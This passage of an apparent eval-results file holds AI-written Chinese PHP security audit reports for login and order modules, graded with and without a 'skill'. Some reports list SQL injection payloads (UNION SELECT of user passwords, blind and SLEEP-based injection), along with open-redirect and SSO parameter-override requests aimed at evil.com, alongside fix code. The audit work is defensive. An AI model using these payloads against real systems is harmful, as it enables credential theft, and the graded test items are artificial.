\u670d\u52a1\u5668\u53ef\u80fd\u5c06 token \u9a8c\u8bc1\u7ed3\u679c\u53d1\u9001\u5230 evil.com\n\n# \u573a\u666f 2\uff1a\u53c2\u6570\u8986\u76d6 \u2014 \u6ce8\u5165\u540c\u540d\u53c2\u6570\u8986\u76d6 state\nGET /login/callback?token=attacker_token&state=foo&state=admin&redirect_uri=...\n\n# \u90e8\u5206 SSO \u6846\u67b6\u53d6\u6700\u540e\u4e00\u4e2a\u540c\u540d\u53c2\u6570 \u2192 state \u88ab\u8986\u76d6\u4e3a admin\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\n// \u4f7f\u7528 http_build_query \u81ea\u52a8\u7f16\u7801\npublic function ssoVerify($token, $state)\n{\n    $params = http_build_query([\n        'token' => $token,\n        'state' => $state,\n    ]);\n    $url = \"https://sso.example.com/verify?{$params}\";\n\n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $url);\n    // ...\n}\n```\n\n---\n\n## \u5ba1\u8ba1\u7ed3\u8bba\n\n### \u5df2\u5ba1\u8ba1\u5165\u53e3\n\n| \u5165\u53e3 | \u8def\u7531 | \u6f0f\u6d1e | \u98ce\u9669 |\n|------|------|------|------|\n| `login()` | `POST /login` | \u5bbd\u5b57\u8282 SQL \u6ce8\u5165 (username) | **\u9ad8** |\n| `login()` | `POST /login` | \u5f00\u653e\u91cd\u5b9a\u5411 (redirect) | **\u4e2d** |\n| `ssoCallback()` | `GET /login/callback` | SSO \u53c2\u6570\u6ce8\u5165 (token/state) | **\u4e2d** |\n\n### \u98ce\u9669\u6c47\u603b\n\n| \u7b49\u7ea7 | \u6570\u91cf | \u8be6\u60c5 |\n|------|------|------|\n| \u9ad8 | 1 | \u5bbd\u5b57\u8282 SQL \u6ce8\u5165 \u2014 `addslashes()` + GBK |\n| \u4e2d | 2 | \u5f00\u653e\u91cd\u5b9a\u5411 (// \u7ed5\u8fc7), SSO \u53c2\u6570\u6ce8\u5165 |\n| \u4f4e | 0 | - |\n| **\u5408\u8ba1** | **3** | |\n\n### \u4fee\u590d\u4f18\u5148\u7ea7\n\n1. **P0\uff08\u7acb\u5373\u4fee\u590d\uff09\uff1a** `authenticate()` \u7684\u5bbd\u5b57\u8282 SQL \u6ce8\u5165 \u2014 \u7528 PDO \u9884\u5904\u7406\u66ff\u6362 `mysqli_query()` + `addslashes()`\n2. **P1\uff0824\u5c0f\u65f6\u5185\uff09\uff1a** `buildRedirectUrl()` \u5f00\u653e\u91cd\u5b9a\u5411 \u2014 \u6539\u4e3a\u767d\u540d\u5355\u6216\u4e25\u683c\u6821\u9a8c\n3. **P1\uff0824\u5c0f\u65f6\u5185\uff09\uff1a** `ssoVerify()` \u53c2\u6570\u6ce8\u5165 \u2014 \u7528 `http_build_query()` \u66ff\u4ee3\u624b\u52a8\u62fc\u63a5\n\n### \u5b89\u5168\u52a0\u56fa\u5efa\u8bae\n\n- \u5168\u7ad9 `set_charset('utf8mb4')`\uff0c\u5f7b\u5e95\u7981\u7528 GBK \u7f16\u7801\u4ee5\u907f\u514d\u5bbd\u5b57\u8282\u6ce8\u5165\n- \u5168\u90e8\u6570\u636e\u5e93\u67e5\u8be2\u8fc1\u79fb\u5230 PDO \u9884\u5904\u7406\u8bed\u53e5\n- \u6240\u6709 URL \u62fc\u63a5\u4f7f\u7528 `http_build_query()` \u81ea\u52a8\u7f16\u7801\n- \u6240\u6709\u91cd\u5b9a\u5411\u4f7f\u7528\u767d\u540d\u5355\u6821\u9a8c\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u89e3\u91ca\u4e86 addslashes + GBK \u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u539f\u7406\uff08\u542b %df%5c \u5b57\u8282\u5e8f\u5217\u5206\u6790\uff09", "passed": true, "evidence": "\u5305\u542b\u8be6\u7ec6\u7684\u5bbd\u5b57\u8282\u6ce8\u5165\u539f\u7406\u8bf4\u660e\uff1a\u539f\u59cb\u5b57\u8282 0xDF 0x27 \u2192 addslashes\u540e 0xDF 0x5C 0x27 \u2192 GBK\u89e3\u7801 0xDF5C(\u904b) 0x27(')\uff0c\u5b8c\u6574\u89e3\u91ca\u4e86\u8f6c\u4e49\u7b26\u88ab'\u5403\u6389'\u7684\u8fc7\u7a0b"}, {"text": "\u62a5\u544a\u6307\u51fa buildRedirectUrl \u4e2d // \u534f\u8bae\u76f8\u5bf9 URL \u53ef\u7ed5\u8fc7 strpos(http://) \u68c0\u67e5", "passed": true, "evidence": "\u660e\u786e\u5199\u51fa'//evil.com \u4e0d\u542b http://\uff0c\u5b8c\u5168\u7ed5\u8fc7'\uff0c\u5e76\u8bf4\u660e\u4e86\u534f\u8bae\u76f8\u5bf9 URL \u7684\u6d4f\u89c8\u5668\u884c\u4e3a"}, {"text": "\u62a5\u544a\u6307\u51fa ssoVerify \u4e2d token/state \u672a URL \u7f16\u7801\u5bfc\u81f4\u67e5\u8be2\u53c2\u6570\u6ce8\u5165", "passed": true, "evidence": "\u6307\u51fa'\u76f4\u63a5\u62fc\u63a5\u5230 URL \u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u672a urlencode\uff09'\uff0c\u7ed9\u51fa\u4e86\u53c2\u6570\u6ce8\u5165\u7684\u5177\u4f53\u573a\u666f\u5982 redirect_uri \u6ce8\u5165"}], "summary": {"passed": 3, "failed": 0, "total": 3, "pass_rate": 1.0}, "timing": {"executor_duration_seconds": 40.0, "total_duration_seconds": 40.0}}}, {"id": "eval-auth-multi-without_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# \u8ba4\u8bc1\u6a21\u5757\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a\n\n\u5ba1\u8ba1\u6587\u4ef6\uff1a\n- Controller/AuthController.php\n- Service/AuthService.php\n\n## \u53d1\u73b0\u7684\u95ee\u9898\n\n### 1. SQL\u6ce8\u5165 (AuthService.php:20-27)\n\n`authenticate()` \u65b9\u6cd5\u4e2d\u4f7f\u7528 `addslashes()` \u5bf9 username \u505a\u8f6c\u4e49\uff0c\u4f46\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u96c6\u4e3a GBK\uff0c\u53ef\u80fd\u5bfc\u81f4\u5bbd\u5b57\u8282\u6ce8\u5165\u3002`addslashes()` \u5728 GBK \u7f16\u7801\u4e0b\u4e0d\u53ef\u9760\u3002\n\n\u4fee\u590d\uff1a\u4f7f\u7528 PDO \u9884\u5904\u7406\u8bed\u53e5\u3002\n\n### 2. \u5f00\u653e\u91cd\u5b9a\u5411 (AuthService.php:39-47)\n\n`buildRedirectUrl()` \u68c0\u67e5\u4e86 `http://` \u548c `https://` \u4f46\u53ef\u4ee5\u7528 `//` \u534f\u8bae\u76f8\u5bf9URL\u7ed5\u8fc7\u3002\n\n\u4fee\u590d\uff1a\u53ea\u5141\u8bb8\u76f8\u5bf9\u8def\u5f84\u6216\u4ee5 `/` \u5f00\u5934\u7684\u8def\u5f84\u3002\n\n### 3. SSO\u53c2\u6570\u62fc\u63a5 (AuthService.php:57)\n\n`ssoVerify()` \u4e2d token \u548c state \u76f4\u63a5\u62fc\u63a5\u5230 URL\uff0c\u672a\u505a URL \u7f16\u7801\u3002\n\n\u4fee\u590d\uff1a\u4f7f\u7528 `urlencode()` \u6216 `http_build_query()`\u3002\n\n## \u603b\u7ed3\n\n\u53d1\u73b0 3 \u4e2a\u5b89\u5168\u95ee\u9898\uff1a1 \u4e2a\u9ad8\u5371\uff08SQL\u6ce8\u5165\uff09\uff0c2 \u4e2a\u4e2d\u5371\uff08\u5f00\u653e\u91cd\u5b9a\u5411\u3001\u53c2\u6570\u6ce8\u5165\uff09\u3002\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u89e3\u91ca\u4e86 addslashes + GBK \u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u539f\u7406\uff08\u542b %df%5c \u5b57\u8282\u5e8f\u5217\u5206\u6790\uff09", "passed": false, "evidence": "\u4ec5\u63d0\u5230'addslashes() \u5728 GBK \u7f16\u7801\u4e0b\u4e0d\u53ef\u9760'\uff0c\u65e0\u5b57\u8282\u5e8f\u5217\u5206\u6790\uff0c\u65e0\u539f\u7406\u89e3\u91ca"}, {"text": "\u62a5\u544a\u6307\u51fa buildRedirectUrl \u4e2d // \u534f\u8bae\u76f8\u5bf9 URL \u53ef\u7ed5\u8fc7 strpos(http://) \u68c0\u67e5", "passed": false, "evidence": "\u4ec5\u8bf4'\u53ef\u4ee5\u7528 // \u534f\u8bae\u76f8\u5bf9URL\u7ed5\u8fc7'\uff0c\u672a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u80fd\u7ed5\u8fc7 strpos \u68c0\u67e5\uff0c\u672a\u8bf4\u660e\u6d4f\u89c8\u5668\u7684\u534f\u8bae\u76f8\u5bf9 URL \u89e3\u6790\u884c\u4e3a"}, {"text": "\u62a5\u544a\u6307\u51fa ssoVerify \u4e2d token/state \u672a URL \u7f16\u7801\u5bfc\u81f4\u67e5\u8be2\u53c2\u6570\u6ce8\u5165", "passed": false, "evidence": "\u4ec5\u8bf4'\u76f4\u63a5\u62fc\u63a5\u5230 URL\uff0c\u672a\u505a URL \u7f16\u7801'\uff0c\u672a\u5206\u6790\u8fd9\u4f1a\u5bfc\u81f4\u4ec0\u4e48\u5b89\u5168\u95ee\u9898\uff08\u53c2\u6570\u622a\u65ad\u3001\u53c2\u6570\u8986\u76d6\uff09"}], "summary": {"passed": 0, "failed": 3, "total": 3, "pass_rate": 0.0}, "timing": {"executor_duration_seconds": 12.0, "total_duration_seconds": 12.0}}}, {"id": "eval-order-sqli-with_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# PHP \u6df1\u5ea6\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a \u2014 \u8ba2\u5355\u6a21\u5757\n\n## \u653b\u51fb\u9762\u5730\u56fe\n\n| \u5165\u53e3 | \u8def\u7531 | \u9274\u6743 | \u7528\u6237\u53ef\u63a7\u8f93\u5165 | \u5bf9\u5e94 Sink |\n|------|------|------|-------------|-----------|\n| `detail()` | `GET /order/detail?id=123` | \u9700\u767b\u5f55 | `$_GET['order_id']` | `mysqli->query()` |\n| `search()` | `GET /order/search?keyword=&sort=` | \u9700\u767b\u5f55 | `$_GET['keyword']`, `$_GET['sort']` | `mysqli->query()` |\n\n**\u6587\u4ef6\u5206\u5e03\uff1a** Controller (OrderController.php) \u2192 Service (OrderService.php) \u2192 Repository (OrderRepository.php)\n\n---\n\n## \u6f0f\u6d1e 1\uff1a[\u9ad8\u5371] SQL \u6ce8\u5165 \u2014 `findByIdAndUser()` \u4e2d `$_GET['order_id']` \u65e0\u8fc7\u6ee4\u62fc\u63a5\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_GET['order_id']                                  \u2190 OrderController.php:32 (\u8def\u7531: GET /order/detail)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\uff0c\u65e0\u8fc7\u6ee4\n$orderId = $_GET['order_id'];                               \u2190 OrderController.php:32\n  \u2193 \u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f20\u5165\n$this->orderService->getOrderDetail($orderId, $userId)      \u2190 OrderController.php:41 (\u8de8\u6587\u4ef6 \u2192 OrderService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\uff0c\u53c2\u6570\u4fdd\u6301\u539f\u503c\npublic function getOrderDetail($orderId, $userId)            \u2190 OrderService.php:18\n  \u2193 \u76f4\u63a5\u900f\u4f20\uff0c\u65e0\u5904\u7406\n$this->orderRepo->findByIdAndUser($orderId, $userId)        \u2190 OrderService.php:22 (\u8de8\u6587\u4ef6 \u2192 OrderRepository.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function findByIdAndUser($orderId, $userId)           \u2190 OrderRepository.php:17\n  \u2193 \u76f4\u63a5\u62fc\u63a5\u5230 SQL \u5b57\u7b26\u4e32\uff08\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u5185\u63d2\u503c\uff09\n$sql = \"SELECT * FROM orders WHERE id = {$orderId}\n        AND user_id = {$userId}\";                            \u2190 OrderRepository.php:21\n  \u2193\n$this->db->query($sql);                                     \u2190 OrderRepository.php:22  [SINK: mysqli::query]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| OrderController.php:34 | `empty($orderId)` | \u274c \u4ec5\u68c0\u67e5\u975e\u7a7a\uff0c\u4e0d\u662f\u5b89\u5168\u8fc7\u6ee4 |\n| OrderService.php:22 | \u900f\u4f20 | \u274c \u65e0\u4efb\u4f55\u5904\u7406 |\n| OrderRepository.php:21 | \u76f4\u63a5\u62fc\u63a5 | \u274c \u65e0\u53c2\u6570\u5316\u3001\u65e0\u8f6c\u4e49\u3001\u65e0\u7c7b\u578b\u8f6c\u6362 |\n\n**\u7ed3\u8bba\uff1a\u6574\u6761\u94fe\u8def\u4e0a ZERO \u6709\u6548\u8fc7\u6ee4\u3002** `empty()` \u53ea\u963b\u6b62\u7a7a\u5b57\u7b26\u4e32\uff0c\u65e0\u6cd5\u963b\u6b62 `1 UNION SELECT ...` \u7b49\u6ce8\u5165 payload\u3002\n\n### \u5229\u7528\u573a\u666f\n\n```\n# \u8054\u5408\u67e5\u8be2\u6ce8\u5165 \u2014 \u7a83\u53d6 users \u8868\u6570\u636e\nGET /order/detail?order_id=1 UNION SELECT 1,username,password,4,5 FROM users--\n\n# \u5e03\u5c14\u76f2\u6ce8 \u2014 \u9010\u5b57\u7b26\u731c\u89e3\nGET /order/detail?order_id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'\n\n# \u65f6\u95f4\u76f2\u6ce8 \u2014 \u65e0\u56de\u663e\u65f6\nGET /order/detail?order_id=1 AND IF(1=1, SLEEP(5), 0)\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\n// \u65b9\u6848 A\uff08\u63a8\u8350 \u2014 \u6570\u5b57\u573a\u666f\u6700\u7b80\uff09\uff1a\u7c7b\u578b\u8f6c\u6362\n// OrderController.php:32\n$orderId = (int)$_GET['order_id'];\n\n// \u65b9\u6848 B\uff08\u66f4\u5065\u58ee\uff09\uff1aPDO \u9884\u5904\u7406\u8bed\u53e5\n// OrderRepository.php:17-22\npublic function findByIdAndUser($orderId, $userId)\n{\n    $stmt = $this->db->prepare(\n        \"SELECT * FROM orders WHERE id = ? AND user_id = ?\"\n    );\n    $stmt->bind_param('ii', $orderId, $userId);\n    $stmt->execute();\n    return $stmt->get_result()->fetch_assoc();\n}\n```\n\n---\n\n## \u6f0f\u6d1e 2\uff1a[\u9ad8\u5371] ORDER BY \u6ce8\u5165 \u2014 `searchByUser()` \u4e2d `$_GET['sort']` \u65e0\u767d\u540d\u5355\u6821\u9a8c\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_GET['sort']                                        \u2190 OrderController.php:63 (\u8def\u7531: GET /order/search)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\uff0c\u9ed8\u8ba4\u503c 'created_at' \u4f46\u7528\u6237\u53ef\u8986\u76d6\n$sortField = $_GET['sort'] ?? 'created_at';                   \u2190 OrderController.php:63\n  \u2193 \u4f5c\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u4f20\u5165\n$this->orderService->searchOrders($userId, $keyword,\n    $sortField)                                               \u2190 OrderController.php:66 (\u8de8\u6587\u4ef6 \u2192 OrderService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\uff0c\u53c2\u6570\u4fdd\u6301\u539f\u503c\npublic function searchOrders($userId, $keyword, $sortField)   \u2190 OrderService.php:35\n  \u2193 \u76f4\u63a5\u900f\u4f20\n$this->orderRepo->searchByUser($userId, $keyword,\n    $sortField)                                               \u2190 OrderService.php:38 (\u8de8\u6587\u4ef6 \u2192 OrderRepository.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function searchByUser($userId, $keyword, $sortField)   \u2190 OrderRepository.php:34\n  \u2193 \u76f4\u63a5\u62fc\u63a5\u5230 ORDER BY \u5b50\u53e5\n$sql .= \" ORDER BY {$sortField} DESC\";                         \u2190 OrderRepository.php:42\n  \u2193\n$this->db->query($sql);                                       \u2190 OrderRepository.php:44  [SINK: mysqli::query]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| OrderController.php:63 | `$_GET['sort'] ?? 'created_at'` | \u274c \u9ed8\u8ba4\u503c\u4ec5\u5728\u53c2\u6570\u4e0d\u5b58\u5728\u65f6\u751f\u6548\uff0c\u7528\u6237\u53ef\u4f20\u5165\u4efb\u610f\u503c |\n| OrderService.php:38 | \u900f\u4f20 | \u274c \u65e0\u4efb\u4f55\u5904\u7406 |\n| OrderRepository.php:42 | \u76f4\u63a5\u62fc\u63a5 | \u274c \u65e0\u767d\u540d\u5355\u6821\u9a8c |\n\n**\u5173\u952e\u5206\u6790\uff1a** ORDER BY / GROUP BY \u5b50\u53e5\u4e2d\u7684\u5b57\u6bb5\u540d**\u4e0d\u80fd\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2**\uff08\u9884\u5904\u7406\u4ec5\u652f\u6301\u503c\u7ed1\u5b9a\uff0c\u4e0d\u652f\u6301\u6807\u8bc6\u7b26\u7ed1\u5b9a\uff09\u3002\u56e0\u6b64\u5373\u4f7f\u7528\u4e86 PDO \u9884\u5904\u7406\uff0c`$sortField` \u4f9d\u7136\u9700\u8981\u767d\u540d\u5355\u6821\u9a8c\u3002\n\n### \u5229\u7528\u573a\u666f\n\n```sql\n# \u57fa\u7840\u6ce8\u5165 \u2014 \u679a\u4e3e\u5217\u6570\nGET /order/search?sort=1\n\n# \u8054\u5408\u67e5\u8be2\u6ce8\u5165\nGET /order/search?sort=(SELECT password FROM users LIMIT 1)\n\n# \u5229\u7528 CASE WHEN \u5b9e\u73b0\u5e03\u5c14\u76f2\u6ce8\nGET /order/search?sort=CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN created_at ELSE id END\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\n// OrderController.php:63 \u2014 \u767d\u540d\u5355\u6821\u9a8c\n$allowedSortFields = ['id', 'created_at', 'updated_at', 'amount', 'order_no'];\n$sortField = in_array($_GET['sort'] ?? '', $allowedSortFields)\n    ? $_GET['sort']\n    : 'created_at';  // \u9ed8\u8ba4\u5b89\u5168\u503c\n```\n\n---\n\n## \u6f0f\u6d1e 3\uff1a[\u4f4e] LIKE \u901a\u914d\u7b26\u672a\u8f6c\u4e49 \u2014 `$_GET['keyword']`\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_GET['keyword']                                     \u2190 OrderController.php:62\n  \u2193\n$keyword = $_GET['keyword'] ?? '';                            \u2190 OrderController.php:62\n  \u2193 \u4f20\u5165 Service \u2192 \u900f\u4f20\u5230 Repository\n  \u2193 real_escape_string \u8f6c\u4e49\n$keyword = $this->db->real_escape_string($keyword);           \u2190 OrderRepository.php:39\n  \u2193 \u62fc\u63a5\u5230 LIKE \u5b50\u53e5\uff08% \u548c _ \u672a\u8f6c\u4e49\uff09\n$sql .= \" AND (... LIKE '%{$keyword}%' ...)\";                \u2190 OrderRepository.php:40\n  \u2193\n$this->db->query($sql);                                       \u2190 OrderRepository.php:44  [SINK]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n- `real_escape_string()` \u5bf9\u5f15\u53f7\u8f6c\u4e49\u6709\u6548\uff08UTF-8 \u7f16\u7801\u4e0d\u4f1a\u89e6\u53d1\u5bbd\u5b57\u8282\u7ed5\u8fc7\uff09\n- \u4f46 `%` \u548c `_` \u662f LIKE \u901a\u914d\u7b26\uff0c\u672a\u8f6c\u4e49\u65f6\u53ef\u88ab\u6ee5\u7528\u5bfc\u81f4\u6027\u80fd\u653b\u51fb\uff08\u5982\u8f93\u5165 `%` \u5339\u914d\u6240\u6709\u8bb0\u5f55\uff09\u6216\u903b\u8f91\u7ed5\u8fc7\n\n**\u7ed3\u8bba\uff1a** \u98ce\u9669\u8f83\u4f4e\uff0c\u4f46\u5efa\u8bae\u8f6c\u4e49 LIKE \u901a\u914d\u7b26\u3002\n\n---\n\n## \u5ba1\u8ba1\u7ed3\u8bba\n\n### \u5df2\u5ba1\u8ba1\u5165\u53e3\n\n| \u5165\u53e3 | \u8def\u7531 | \u6f0f\u6d1e | \u98ce\u9669 |\n|------|------|------|------|\n| `detail()` | `GET /order/detail` | SQL \u6ce8\u5165\uff08$orderId \u65e0\u8fc7\u6ee4\uff09 | **\u9ad8** |\n| `search()` | `GET /order/search` | ORDER BY \u6ce8\u5165\uff08$sortField \u65e0\u767d\u540d\u5355\uff09 | **\u9ad8** |\n| `search()` | `GET /order/search` | LIKE \u901a\u914d\u7b26\u672a\u8f6c\u4e49\uff08$keyword\uff09 | **\u4f4e** |\n\n### \u98ce\u9669\u6c47\u603b\n\n| \u7b49\u7ea7 | \u6570\u91cf | \u8be6\u60c5 |\n|------|------|------|\n| \u9ad8 | 2 | SQL \u6ce8\u5165 (order_id), ORDER BY \u6ce8\u5165 (sort) |\n| \u4e2d | 0 | - |\n| \u4f4e | 1 | LIKE \u901a\u914d\u7b26\u672a\u8f6c\u4e49 (keyword) |\n| **\u5408\u8ba1** | **3** | |\n\n### \u4fee\u590d\u4f18\u5148\u7ea7\n\n1. **P0\uff08\u7acb\u5373\u4fee\u590d\uff09\uff1a** `findByIdAndUser()` \u7684 `$orderId` \u6ce8\u5165 \u2014 \u52a0 `(int)` \u8f6c\u6362\u6216\u7528\u9884\u5904\u7406\n2. **P0\uff08\u7acb\u5373\u4fee\u590d\uff09\uff1a** `searchByUser()` \u7684 `$sortField` ORDER BY \u6ce8\u5165 \u2014 \u52a0\u767d\u540d\u5355\u6821\u9a8c\n3. **P3\uff08\u4e0b\u4e2a\u8fed\u4ee3\uff09\uff1a** LIKE \u901a\u914d\u7b26\u8f6c\u4e49\n\n### \u5b89\u5168\u52a0\u56fa\u5efa\u8bae\n\n- \u5168\u7ad9\u7edf\u4e00\u4f7f\u7528 PDO \u9884\u5904\u7406\u8bed\u53e5\uff0c\u7981\u6b62\u76f4\u63a5\u62fc\u63a5 SQL\n- Repository \u5c42\u6240\u6709 `query()` \u8c03\u7528\u589e\u52a0\u53c2\u6570\u7ed1\u5b9a\n- \u5bf9 `ORDER BY` / `GROUP BY` \u7b49\u65e0\u6cd5\u53c2\u6570\u5316\u7684\u5b50\u53e5\uff0c\u5f3a\u5236\u767d\u540d\u5355\u6821\u9a8c\n- \u5728 Service \u5c42\u589e\u52a0\u8f93\u5165\u6821\u9a8c\u5c42\uff08\u7c7b\u578b\u8f6c\u6362\u3001\u683c\u5f0f\u6821\u9a8c\uff09\uff0c\u4e0d\u5e94\u5047\u8bbe Repository \u5c42\u4f1a\u5904\u7406\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b $_GET['order_id'] \u4ece Controller \u7ecf Service \u5230 Repository \u7684\u5b8c\u6574\u8de8\u6587\u4ef6\u4f20\u64ad\u94fe\u8def", "passed": true, "evidence": "\u4f20\u64ad\u94fe\u8def\u90e8\u5206\u5b8c\u6574\u5217\u51fa\u4e86: Source \u2192 OrderController.php:32 \u2192 OrderController.php:41 (\u8de8\u6587\u4ef6) \u2192 OrderService.php:18 \u2192 OrderService.php:22 (\u8de8\u6587\u4ef6) \u2192 OrderRepository.php:17 \u2192 OrderRepository.php:21 \u2192 OrderRepository.php:22 [SINK]\uff0c\u6bcf\u4e2a\u8282\u70b9\u6807\u6ce8\u4e86\u6587\u4ef6\u540d\u548c\u884c\u53f7"}, {"text": "\u62a5\u544a\u660e\u786e\u6307\u51fa $sortField \u5728 ORDER BY \u4e2d\u65e0\u6cd5\u901a\u8fc7\u53c2\u6570\u5316\u67e5\u8be2\u9632\u62a4\uff0c\u9700\u8981\u767d\u540d\u5355", "passed": true, "evidence": "\u5173\u952e\u5206\u6790\u660e\u786e\u5199\u9053\uff1a'ORDER BY / GROUP BY \u5b50\u53e5\u4e2d\u7684\u5b57\u6bb5\u540d\u4e0d\u80fd\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\uff08\u9884\u5904\u7406\u4ec5\u652f\u6301\u503c\u7ed1\u5b9a\uff0c\u4e0d\u652f\u6301\u6807\u8bc6\u7b26\u7ed1\u5b9a\uff09\u3002\u56e0\u6b64\u5373\u4f7f\u7528\u4e86 PDO \u9884\u5904\u7406\uff0c$sortField \u4f9d\u7136\u9700\u8981\u767d\u540d\u5355\u6821\u9a8c\u3002'"}, {"text": "\u62a5\u544a\u5305\u542b\u5177\u4f53\u7684 SQL \u6ce8\u5165\u653b\u51fb payload \u793a\u4f8b", "passed": true, "evidence": "\u5229\u7528\u573a\u666f\u5305\u542b: UNION SELECT payload\u3001\u5e03\u5c14\u76f2\u6ce8 SUBSTRING \u793a\u4f8b\u3001\u65f6\u95f4\u76f2\u6ce8 SLEEP payload\u3001CASE WHEN \u5e03\u5c14\u76f2\u6ce8\uff08ORDER BY \u4e0a\u4e0b\u6587\uff09"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u4fee\u590d\u4ee3\u7801\uff08\u4e0d\u4ec5\u662f\u5efa\u8bae\uff09", "passed": true, "evidence": "\u6bcf\u4e2a\u6f0f\u6d1e\u90fd\u6709\u5b8c\u6574\u4fee\u590d\u4ee3\u7801: (int)\u7c7b\u578b\u8f6c\u6362\u4ee3\u7801\u3001PDO bind_param \u4ee3\u7801\u3001\u767d\u540d\u5355 in_array \u6821\u9a8c\u4ee3\u7801"}], "summary": {"passed": 4, "failed": 0, "total": 4, "pass_rate": 1.0}, "timing": {"executor_duration_seconds": 45.0, "total_duration_seconds": 45.0}}}, {"id": "eval-order-sqli-without_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# \u8ba2\u5355\u6a21\u5757\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a\n\n## \u6587\u4ef6\u6982\u89c8\n\n\u5ba1\u8ba1\u4e86\u4ee5\u4e0b\u6587\u4ef6\uff1a\n- `Controller/OrderController.php` \u2014 \u4e24\u4e2a\u63a5\u53e3\uff1a`detail()` \u548c `search()`\n- `Service/OrderService.php` \u2014 \u900f\u4f20\u5c42\uff0c\u8c03\u7528 Repository\n- `Repository/OrderRepository.php` \u2014 \u6570\u636e\u5e93\u64cd\u4f5c\u5c42\n\n## \u53d1\u73b0\u7684\u95ee\u9898\n\n### \u95ee\u98981\uff1aSQL\u6ce8\u5165 \u2014 order_id \u53c2\u6570\n\n**\u4f4d\u7f6e\uff1a** `OrderController.php:32` \u2192 `OrderRepository.php:21`\n\n`$_GET['order_id']` \u5728\u7ecf\u8fc7 Controller \u548c Service \u4e24\u5c42\u4f20\u9012\u540e\uff0c\u5728 `OrderRepository::findByIdAndUser()` \u4e2d\u76f4\u63a5\u62fc\u63a5\u5230 SQL\uff1a\n\n```php\n$sql = \"SELECT * FROM orders WHERE id = {$orderId} AND user_id = {$userId}\";\n```\n\n\u4fee\u590d\uff1a\u4f7f\u7528 `(int)$_GET['order_id']` \u6216\u9884\u5904\u7406\u8bed\u53e5\u3002\n\n### \u95ee\u98982\uff1aORDER BY \u6ce8\u5165 \u2014 sort \u53c2\u6570\n\n**\u4f4d\u7f6e\uff1a** `OrderController.php:63` \u2192 `OrderRepository.php:42`\n\n`$_GET['sort']` \u88ab\u76f4\u63a5\u62fc\u63a5\u5230 ORDER BY \u5b50\u53e5\uff1a\n\n```php\n$sql .= \" ORDER BY {$sortField} DESC\";\n```\n\n\u4fee\u590d\uff1a\u4f7f\u7528\u5b57\u6bb5\u540d\u767d\u540d\u5355\u3002\n\n### \u95ee\u98983\uff1akeyword \u53c2\u6570\u7684 LIKE \u901a\u914d\u7b26\u672a\u8f6c\u4e49\n\n`$_GET['keyword']` \u867d\u7136\u7ecf\u8fc7\u4e86 `real_escape_string()` \u8f6c\u4e49\uff0c\u4f46 LIKE \u7684 `%` \u548c `_` \u672a\u88ab\u5904\u7406\u3002\u98ce\u9669\u8f83\u4f4e\u3002\n\n## \u603b\u7ed3\n\n\u5171\u53d1\u73b0 2 \u4e2a\u9ad8\u5371\u6f0f\u6d1e\uff08SQL \u6ce8\u5165 + ORDER BY \u6ce8\u5165\uff09\uff0c1 \u4e2a\u4f4e\u98ce\u9669\u95ee\u9898\u3002\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b $_GET['order_id'] \u4ece Controller \u7ecf Service \u5230 Repository \u7684\u5b8c\u6574\u8de8\u6587\u4ef6\u4f20\u64ad\u94fe\u8def", "passed": false, "evidence": "\u4ec5\u63d0\u5230'OrderController.php:32 \u2192 OrderRepository.php:21'\uff0c\u7f3a\u5c11\u8de8\u6587\u4ef6 Service \u5c42\u7684\u4f20\u64ad\u7ec6\u8282\uff0c\u6ca1\u6709\u9010\u884c\u7684\u94fe\u8def\u8ffd\u8e2a\uff0c\u6ca1\u6709\u6807\u6ce8\u6bcf\u4e2a\u8282\u70b9\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7"}, {"text": "\u62a5\u544a\u660e\u786e\u6307\u51fa $sortField \u5728 ORDER BY 